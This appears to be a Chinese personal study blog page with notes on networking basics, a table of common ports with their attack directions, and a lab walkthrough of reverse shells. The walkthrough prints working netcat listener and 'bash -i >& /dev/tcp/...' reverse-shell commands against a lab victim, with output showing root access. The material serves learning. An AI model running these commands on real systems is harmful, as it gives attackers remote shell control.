<p>– 两级IP 地址变为三级 IP 地址<br>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}</p>
<p>通常 划分子网是一个单位内部事情 外网看不见划分情况 </p>
<p>这个单位对外仍然表现为一个网络。 </p>
<p>– 从其他网络发送给本单位某个主机的 IP 数据报 </p>
<p>– 仍然根据 IP 数据报的<strong>目的网络号 net-id</strong>，先找到连接 在本单位网络上的路由器</p>
<p>– 单位网<strong>路由器</strong>收到后，再按目的网络号 net-id 和子网 号 subnet-id 找到目的子网</p>
<p>– 最后将 IP 数据报直接交付目的主机</p>
<p><strong>如何判断是否划分子网？</strong></p>
<p>• 从IP数据报的首部无法判断 </p>
<p><strong>• 使用子网掩码(subnet mask)</strong></p>
<hr>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a><strong>运输层</strong></h2><p>TCP/IP 的运输层有两个不同的协议： </p>
<p><strong>(1)用户数据报协议 UDP   (User Datagram Protocol)</strong> </p>
<p>– 当运输层采用无连接的 UDP 协议时，这种逻辑通信信 道是一条不可靠信道。 </p>
<p><strong>(2) 传输控制协议 TCP     (Transmission Control Protocol)</strong> </p>
<p>– 当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。</p>
<p>TCP 最主要的特点 </p>
<p>• TCP 是面向连接的           <strong>• 每一条 TCP 连接只能有两个端点</strong> 只能是点对点（一对一）</p>
<p>• TCP 提供可靠交付的服务 <strong>无差错，不丢失，不重复，按序到达</strong></p>
<p>• TCP 提供全双工通信 • TCP 是面向字节流的</p>
<h3 id="三次握手建立-TCP-连接"><a href="#三次握手建立-TCP-连接" class="headerlink" title="三次握手建立 TCP 连接"></a><strong>三次握手建立 TCP 连接</strong></h3><p><strong>A 的 TCP 向 B</strong> 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，</p>
<p>表明传送数据时的第一个数据字节的序号是 x。</p>
<p><strong>B 的 TCP 收到连接</strong>请求报文段后，如同意，则 发回确认。</p>
<p>B 在确认报文段中应使 SYN = 1，使 ACK = 1， 其确认号ack = x + 1，自己选择的序号 seq = y。</p>
<p><strong>A 收到此报文段后</strong>向 B 给出确认，其ACK = 1， 确认号 ack = y + 1,  A 的 TCP 通知上层应用进程，连接已经建立</p>
<p><strong>B 的 TCP 收到主机A 的确认后</strong>，也通知其上层 应用进程：TCP 连接已经建立。</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/2.png" style="zoom:80%;">

<hr>
<p>三类端口 </p>
<p>• 熟知端口，数值一般为 0~1023。 </p>
<p>• 登记端口号，数值为1024~49151，为没有熟知 端口号的应用程序使用的。使用这个范围的端口 号必须在 IANA 登记，以防止重复。 </p>
<p>• 客户端口号或短暂端口号，数值为49152~65535， 留给客户进程选择暂时使用。当服务器进程收到 客户进程的报文时，就知道了客户进程所使用的 动态端口号。通信结束后，这个端口号可供其他 客户进程以后使</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a><strong>应用层</strong></h2><p>超文本传送协议 HTTP<br>• 用户点击鼠标后所发生的事件</p>
<p> (1) 浏览器分析超链指向页面的 URL。</p>
<p> (2) 浏览器向 DNS 请求解析 <a href="http://www.tsinghua.edu.cn" target="_blank" rel="noopener">www.tsinghua.edu.cn</a> 的 IP 地址。</p>
<p> (3) 域名系统 DNS 解析出清华大学服务器的 IP 地址。</p>
<p> (4) 浏览器与服务器建立 TCP 连接 </p>
<p>(5) 浏览器发出取文件命令： GET /chn/yxsz/index.htm。</p>
<p> (6) 服务器给出响应，把文件 index.htm 发给浏览器。</p>
<p> (7) TCP 连接释放。 </p>
<p>(8) 浏览器显示“清华大学院系设置”文件 index.htm 中的所 有文本。</p>
<h3 id="HTTPS加密协议过程："><a href="#HTTPS加密协议过程：" class="headerlink" title="HTTPS加密协议过程："></a><strong>HTTPS加密协议过程：</strong></h3><p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<hr>
<h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a><strong>常用端口</strong></h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a><strong>文件共享服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>21/69</strong></td>
<td><strong>FTP/TFTP 文件传输协议</strong></td>
<td><strong>允许匿名上传、下载、爆破和嗅探</strong></td>
</tr>
<tr>
<td><strong>2049</strong></td>
<td><strong>NFS 服务</strong></td>
<td><strong>配置不当</strong></td>
</tr>
<tr>
<td><strong>139</strong></td>
<td><strong>Samba 服务</strong></td>
<td><strong>爆破、未授权访问、远程代码执行</strong></td>
</tr>
<tr>
<td><strong>389</strong></td>
<td><strong>LDAP 目录访问协议</strong></td>
<td><strong>注入、允许匿名访问、弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="远程连接服务器端口"><a href="#远程连接服务器端口" class="headerlink" title="远程连接服务器端口"></a><strong>远程连接服务器端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>22</strong></td>
<td><strong>SSH远程连接</strong></td>
<td><strong>爆破、SSH隧道及内网代理转发、文件传输</strong></td>
</tr>
<tr>
<td><strong>23</strong></td>
<td><strong>Telnet远程登录服务</strong></td>
<td><strong>爆破、嗅探、弱口令</strong></td>
</tr>
<tr>
<td><strong>3389</strong></td>
<td><strong>RDP远程桌面连接</strong></td>
<td><strong>Shift后门(Windows Server 2003以下版本)、爆破</strong></td>
</tr>
<tr>
<td><strong>5900</strong></td>
<td><strong>VNC</strong></td>
<td><strong>弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5632</strong></td>
<td><strong>PyAnywhere服务</strong></td>
<td><strong>抓密码、代码执行</strong></td>
</tr>
</tbody></table>
<p><strong>22端口：</strong>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的，就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式，就是“中间人”冒充真正的服务器接收你的传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。</p>
<p>SSH的英文全称是Secure  SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够<strong>防止DNS和IP欺骗</strong>。还有一个额外的好处就是<strong>传输的数据是经过压缩</strong>的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道”。 </p>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a><strong>Web应用服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>80/443/8080</strong></td>
<td><strong>常见Web服务端口</strong></td>
<td><strong>Web攻击、爆破、对应服务版本漏洞</strong></td>
</tr>
<tr>
<td><strong>7001/70022</strong></td>
<td><strong>Weblogic控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>8080/8089</strong></td>
<td><strong>Jboos/Resin/Jetty/Jenkins</strong></td>
<td><strong>反序列化、控制台弱口令</strong></td>
</tr>
<tr>
<td><strong>9090</strong></td>
<td><strong>WebSphere控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>4848</strong></td>
<td><strong>GlassFish控制台</strong></td>
<td><strong>弱口令</strong></td>
</tr>
<tr>
<td><strong>1352</strong></td>
<td><strong>Lotus dominion邮件服务</strong></td>
<td><strong>弱口令、信息泄露、爆破</strong></td>
</tr>
<tr>
<td><strong>10000</strong></td>
<td><strong>Webmin-Web控制面板</strong></td>
<td><strong>弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="数据库端口"><a href="#数据库端口" class="headerlink" title="数据库端口"></a><strong>数据库端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>3306</strong></td>
<td><strong>MySQL</strong></td>
<td><strong>注入、提权、爆破</strong></td>
</tr>
<tr>
<td><strong>1433</strong></td>
<td><strong>MSSQL</strong></td>
<td><strong>注入、提权、SAP弱口令、爆破</strong></td>
</tr>
<tr>
<td><strong>1521</strong></td>
<td><strong>Oracle</strong></td>
<td><strong>TNS爆破、注入、反弹Shell</strong></td>
</tr>
<tr>
<td><strong>5432</strong></td>
<td><strong>PostgreSQL</strong></td>
<td><strong>爆破、注入、弱口令</strong></td>
</tr>
<tr>
<td><strong>27017/27018</strong></td>
<td><strong>MongoDB</strong></td>
<td><strong>爆破、未授权访问</strong></td>
</tr>
<tr>
<td><strong>6379</strong></td>
<td><strong>Redis</strong></td>
<td><strong>未授权访问、弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5000</strong></td>
<td><strong>SysBase/DB2</strong></td>
<td><strong>爆破、注入</strong></td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a><strong>邮件服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>25</strong></td>
<td><strong>SMTP 邮件服务</strong></td>
<td><strong>邮件伪造</strong></td>
</tr>
<tr>
<td><strong>109/110</strong></td>
<td><strong>POP2/POP3</strong></td>
<td><strong>爆破、嗅探</strong></td>
</tr>
<tr>
<td><strong>143</strong></td>
<td><strong>IMAP</strong></td>
<td><strong>爆破</strong></td>
</tr>
</tbody></table>
<p>端口说明：<strong>109端口是为POP2（Post Office Protocol Version  2，邮局协议2）服务开放的，110端口是为POP3（邮件协议3）服务开放的，POP2、POP3都是主要用于接收邮件的，目前POP3使用的比较多</strong>，许多服务器都同时支持POP2和POP3。客户端可以使用POP3协议来访问服务端的邮件服务，如今ISP的绝大多数邮件服务器都是使用该协议。在使用电子邮件客户端程序的时候，会要求输入POP3服务器地址，默认情况下使用的就是110端口。</p>
<p>端口漏洞：POP2、POP3在提供邮件接收服务的同时，也出现了不少的漏洞。单单POP3服务在用户名和密码交换缓冲区溢出的漏洞就不少于20个，比如WebEasyMail POP3 Server合法用户名信息泄露漏洞，通过该漏洞远程攻击者可以验证用户账户的存在。另外，110端口也被ProMail  trojan等木马程序所利用，通过110端口可以窃取POP账号用户名和密码。</p>
<p>操作建议：如果是执行邮件服务器，可以打开该端口</p>
<h3 id="网络协议端口"><a href="#网络协议端口" class="headerlink" title="网络协议端口"></a><strong>网络协议端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>53</strong></td>
<td><strong>DNS域名系统</strong></td>
<td><strong>允许区域传送、DNS劫持、缓存投毒、欺骗</strong></td>
</tr>
<tr>
<td><strong>67/68</strong></td>
<td><strong>DHCP服务</strong></td>
<td><strong>劫持、欺骗</strong></td>
</tr>
<tr>
<td><strong>161</strong></td>
<td><strong>SNMP协议</strong></td>
<td><strong>爆破、搜集目标内网信息</strong></td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a><strong>特殊服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>2128</strong></td>
<td><strong>Zookeeper 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>8068</strong></td>
<td><strong>Zabbix 服务</strong></td>
<td><strong>远程执行、SQL注入</strong></td>
</tr>
<tr>
<td><strong>9200/9300</strong></td>
<td><strong>Elasticsearch 服务</strong></td>
<td><strong>远程执行</strong></td>
</tr>
<tr>
<td><strong>11211</strong></td>
<td><strong>Memcache 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>512/513/514</strong></td>
<td><strong>Linux Rexec 服务</strong></td>
<td><strong>爆破、Rlogin登陆</strong></td>
</tr>
<tr>
<td><strong>873</strong></td>
<td><strong>Rsync 服务</strong></td>
<td><strong>匿名访问、文件上传</strong></td>
</tr>
<tr>
<td><strong>3690</strong></td>
<td><strong>Svn 服务</strong></td>
<td><strong>Svn泄露、未授权访问</strong></td>
</tr>
<tr>
<td><strong>50000</strong></td>
<td><strong>SAP Management Console</strong></td>
<td><strong>远程执行</strong></td>
</tr>
</tbody></table>
<h3 id="端口概念"><a href="#端口概念" class="headerlink" title="端口概念"></a><strong>端口概念</strong></h3><p>在网络技术中，端口（Port）大致有两种意思：一是物理意义上的端口，比如，ADSL  Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。我们这里将要介绍的就是逻辑意义上的端口。</p>
<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a><strong>端口分类</strong></h3><p>逻辑意义上的端口有多种分类标准，下面将介绍两种常见的分类：</p>
<p><strong>1、按端口号分布划分</strong></p>
<p>（1）知名端口（Well-Known Ports）</p>
<p><strong>知名端口即众所周知的端口号，范围从0到1023</strong>，这些端口号一般固定分配给一些服务。比如21端口分配给FTP服务，25端口分配给SMTP（简单邮件传输协议）服务，80端口分配给HTTP服务，135端口分配给RPC（远程过程调用）服务等等。</p>
<p>（2）动态端口（Dynamic Ports）</p>
<p>　　<strong>动态端口的范围从1024到65535</strong>，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序。在关闭程序进程后，就会释放所占用的端口号。</p>
<p>　不过，动态端口也常常被病毒木马程序所利用，如冰河默认连接端口是7626、WAY 2.4是8011、Netspy 3.0是7306、YAI病毒是1024等等。</p>
<p><strong>2、按协议类型划分</strong></p>
<p>按协议类型划分，可以分为TCP、UDP、IP和ICMP（Internet控制消息协议）等端口。下面主要介绍TCP和UDP端口：</p>
<p>（1）TCP端口</p>
<p>TCP端口，即传输控制协议端口，需要在客户端和服务器之间建立连接，这样可以提供可靠的数据传输。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。</p>
<p>（2）UDP端口</p>
<p>UDP端口，即用户数据包协议端口，无需在客户端和服务器之间建立连接，安全性得不到保障。<strong>常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口</strong>，QQ使用的8000和4000端口等等。</p>
<h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a><strong>查看端口</strong></h3><p>在Windows 2000/XP/Server 2003中要查看端口，可以使用Netstat命令：</p>
<p>依次点击“开始→运行”，键入“cmd”并回车，打开命令提示符窗口。在命令提示符状态下键入“netstat -a -n”，按下回车键后就可以看到以数字形式显示的TCP和UDP连接的端口号及状态（如图）。</p>
<p>小知识：Netstat命令用法</p>
<p>命令格式：Netstat －a －e －n －o －s</p>
<p><strong>一般用 netstat -ano 来查看使用中的端口</strong></p>
<p>　　－a 表示显示所有活动的TCP连接以及计算机监听的TCP和UDP端口。</p>
<p>　　－e 表示显示以太网发送和接收的字节数、数据包数等。</p>
<p>　　－n 表示只以数字形式显示所有活动的TCP连接的地址和端口号。</p>
<p>　　－o 表示显示活动的TCP连接并包括每个连接的进程ID（PID）。</p>
<p>　　－s 表示按协议显示各种连接的统计信息，包括端口号</p>
<hr>
<p>参考：<a href="https://www.cnblogs.com/zane-s/p/12435873.html" target="_blank" rel="noopener">https://www.cnblogs.com/zane-s/p/12435873.html</a></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-web杂烩" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/12/web%E6%9D%82%E7%83%A9/"
    >web杂烩</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/12/web%E6%9D%82%E7%83%A9/" class="article-date">
  <time datetime="2020-04-12T14:25:31.000Z" itemprop="datePublished">2020-04-12</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>以下工具或命令不能实现端口转发是（）</p>
<p>端口转发（Port forwarding）是安全壳(SSH)  为网络安全通信使用的一种方法。SSH可以利用端口转发技术来传输其他TCP/IP协议的报文，当使用这种方式时，SSH就为其他服务在客户端和服务器端建立了一条安全的传输管道。端口转发利用本客户机端口映射到服务器端口来工作，SSH可以映射所有的服务器端口到本地端口，但要设置1024以下的端口需要根用户权限。在使用防火墙的网络中，如果设置为允许SSH服务通过(开启了22端口)，而阻断了其他服务，则被阻断的服务仍然可以通过端口转发技术转发数据包</p>
<p>ssh可以实现本地端口转发,远程端口转发,动态端口转发。  <a href="https://www.cnblogs.com/keerya/articles/7612715.html" target="_blank" rel="noopener">https://www.cnblogs.com/keerya/articles/7612715.html</a>     netsh端口转发:  <a href="https://www.jianshu.com/p/3b108844729e" target="_blank" rel="noopener">https://www.jianshu.com/p/3b108844729e</a>  </p>
<p>htran端口转发:  <a href="https://cloud.tencent.com/developer/article/1365274" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1365274</a>   </p>
<p>MSBuild: MSBuild 是 Microsoft 和 Visual Studio的生成系统。可以用来绕过AppLocker  <a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5</a>   </p>
<p>更多端口转发工具  <a href="http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4" target="_blank" rel="noopener">http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4</a>   <a href="https://www.freebuf.com/articles/web/170970.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/170970.html</a></p>
<hr>
<p>php://phar是用来读取phar文件的 phar文件在使用特定的函数时会触发反序列化漏洞具体利用方法 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<h2 id="反弹shell原理与实现"><a href="#反弹shell原理与实现" class="headerlink" title="反弹shell原理与实现"></a><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">反弹shell原理与实现</a></h2><p><strong>什么是反弹shell？</strong></p>
<p>　　反弹shell（reverse  shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse  shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<p><strong>为什么要反弹shell？</strong></p>
<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
<p>有如下情况：</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 </p>
<p>2.目标机器的ip动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<p>==============================================================</p>
<p><strong>反弹shell实验</strong></p>
<p>环境：两台CentOS7.6服务器</p>
<ul>
<li>攻击端 hacker：10.201.61.194 </li>
<li>受害端 victim：10.201.61.195 </li>
</ul>
<p>\1. 攻击端监听一个端口：</p>
<p>[root@hacker ~]# <strong>nc -lvp 6767</strong></p>
<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
<p><em>Ncat: Listening on :::6767</em></p>
<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
<p>2.受害端生成一个反弹shell：</p>
<p>[root@victim ~]# <strong>bash -i &gt;&amp; /dev/tcp/10.201.61.194/6767 0&gt;&amp;1</strong></p>
<p>3.攻击端已获取到受害端的bash：</p>
<p>[root@hacker ~]# nc -lvp 6767</p>
<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
<p><em>Ncat: Listening on :::6767</em></p>
<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
<p><em>Ncat: Connection from 10.201.61.195.</em></p>
<p><em>Ncat: Connection from 10.201.61.195:46836.</em></p>
<p>[root@victim ~]#     //攻击端已获得受害端的远程交互式shell</p>
<p>[root@victim ~]# hostname</p>
<p>hostname</p>
<p>victim</p>
<p><strong>解释：</strong></p>
<p>\1. nc -lvp 6767</p>
<p> -l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
<p>\2. bash -i</p>
<p>-i interactive。即产生一个交互式的shell（bash）。</p>
<p>\3. /dev/tcp/IP/PORT </p>
<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 <code>bash</code> 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
<p><strong>通过以下4个小测试来分析反弹shell实现过程：</strong></p>
<p>（PS: 注意执行步骤顺序）</p>
<p><strong>测试1：</strong></p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //第三步<br>[root@victim ~]# </p>
<p>攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566   //第一步</p>
<p>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:49018.</p>
<p>victim   //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</p>
<p><strong>测试2：</strong></p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &lt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。<br>victim</p>
<p> 攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:50412.<br>hostname    //第三步（攻击端执行命令）</p>
<p><strong>测试3</strong>：</p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1    //第二步<br>[root@victim ~]# hostname    //受害端回显命令<br>[root@victim ~]# id    //受害端回显命令<br>[root@victim ~]# hahaha    //受害端回显命令<br>bash: hahaha: command not found    //受害端回显命令。显示错误命令的输出。<br>[root@victim ~]# </p>
<p> 攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:36792.<br>hostname    //第三步（攻击端执行命令）<br>victim<br>id    //第四步（攻击端执行命令）<br>uid=0(root) gid=0(root) groups=0(root)<br>hahaha    //第五步（执行一个错误的命令）</p>
<p>//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</p>
<p> <strong>测试4</strong>（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）： </p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 2&gt;&amp;1    //第二步。或 # bash -i &amp;&gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 （注：&amp;&gt;或&gt;&amp; 表示混合输出，即标准输出1 + 错误输出2）</p>
<p>攻击端：</p>
<p>[root@hacker <del>]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:51182.<br>[root@victim ~]# hostname    //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令</del><br>hostname<br>victim</p>
<p>//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用<del>~</del></p>
<h2 id="排查本机网络问题："><a href="#排查本机网络问题：" class="headerlink" title="排查本机网络问题："></a><strong>排查本机网络问题：</strong></h2><table>
<thead>
<tr>
<th><strong>1</strong></th>
<th><strong>ping 127.0.0.1</strong></th>
<th><strong>排查本机 TCP/IP 协议是否正常</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>2</strong></td>
<td><strong>ping 本机IP</strong></td>
<td><strong>排查网卡或网卡驱动是否正常</strong></td>
</tr>
<tr>
<td><strong>3</strong></td>
<td><strong>ping 同网段IP</strong></td>
<td><strong>排查交换机端口工作模式、vlan划分</strong></td>
</tr>
<tr>
<td><strong>4</strong></td>
<td><strong>ping 通网段网关</strong></td>
<td><strong>排查主机到本地网络是否正常</strong></td>
</tr>
<tr>
<td><strong>5</strong></td>
<td><strong>ping 公网IP</strong></td>
<td><strong>排查路由是否正常</strong></td>
</tr>
<tr>
<td><strong>6</strong></td>
<td><strong>ping 公网某个域名</strong></td>
<td><strong>排查DNS服务配置是否正常</strong></td>
</tr>
</tbody></table>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-python编程" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/06/python%E7%BC%96%E7%A8%8B/"
    >python编程</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/06/python%E7%BC%96%E7%A8%8B/" class="article-date">
  <time datetime="2020-04-06T04:51:43.000Z" itemprop="datePublished">2020-04-06</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
